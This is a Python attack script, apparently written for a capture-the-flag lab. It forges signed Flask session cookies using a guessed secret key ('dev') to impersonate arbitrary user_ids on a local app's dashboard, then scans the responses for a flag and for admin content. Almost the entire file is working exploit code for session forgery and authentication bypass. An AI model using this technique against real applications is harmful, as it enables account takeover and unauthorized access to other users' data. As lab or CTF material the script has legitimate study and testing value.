import requests
import re
from itsdangerous import URLSafeTimedSerializer
import hashlib

# Target URL
base_url = "http://127.0.0.1:32883"
dashboard_url = f"{base_url}/dashboard"

# Working secret key found
secret_key = 'dev'

def forge_flask_session(secret_key, user_id):
    """Forge a Flask session cookie using itsdangerous"""
    try:
        serializer = URLSafeTimedSerializer(
            secret_key,
            salt='cookie-session',
            signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
        )
        session_data = {'user_id': user_id}
        forged_cookie = serializer.dumps(session_data)
        return forged_cookie
    except Exception as e:
        print(f"[!] Error forging session: {e}")
        return None

# Test a few specific user_ids and print their FULL responses to look for differences
test_user_ids = [1, 10032, 10000, 10050]

print("[*] Testing specific user_ids for full response content")
print("="*80)

responses_dict = {}

for user_id in test_user_ids:
    forged_cookie = forge_flask_session(secret_key, user_id)
    if forged_cookie:
        cookies = {'session': forged_cookie}
        response = requests.get(dashboard_url, cookies=cookies, timeout=5)
        
        print(f"\n[+] user_id={user_id}")
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Content-Length: {len(response.content)}")
        
        # Store response for comparison
        responses_dict[user_id] = response.text
        
        # Look for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!] FLAG FOUND: {flag_match.group(0)}")
        
        # Look for other interesting patterns
        admin_match = re.search(r'admin|Admin|ADMIN', response.text, re.I)
        if admin_match:
            print(f"[+] Found 'admin' reference")
        
        # Print full response
        print(f"\n[+] Full Response:\n{response.text}")
        print("="*80)

# Check if all responses are identical
print("\n[*] Comparing responses...")
response_texts = list(responses_dict.values())
if len(set(response_texts)) == 1:
    print("[-] All responses are IDENTICAL - no user-specific content found")
    print("[-] This suggests dashboard shows same login page for all forged sessions")
else:
    print("[+] Found DIFFERENT responses!")
    for uid, resp in responses_dict.items():
        print(f"  user_id={uid}: {len(resp)} bytes")

